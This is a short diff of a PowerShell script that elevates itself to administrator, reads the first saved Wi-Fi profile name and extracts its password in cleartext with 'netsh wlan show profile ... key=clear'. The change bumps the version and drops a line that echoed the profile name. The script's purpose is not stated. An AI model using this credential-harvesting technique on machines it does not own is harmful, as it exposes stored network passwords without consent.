@@ -17,13 +17,12 @@ if ($myWindowsPrincipal.IsInRole($adminRole))
 	[System.Diagnostics.Process]::Start($newProcess);
 	exit
 }##############
-$ver = "1.0.5"
+$ver = "1.0.6"
 $data = netsh wlan show profile
 $datePattern = [Regex]::new("(?<=All User Profile     : ).*\S")
 $matches = $datePattern.Matches($data)
 $wifiprofile = $matches.Value
 $wifiprofile = $wifiprofile.Substring(0, $wifiprofile.IndexOf(' '))
-$wifiprofile
 $data2 = netsh wlan show profile $wifiprofile key=clear
 $datePattern2 = [Regex]::new("(?<=Key Content            : ).*\S")
 $matches2 = $datePattern2.Matches($data2)
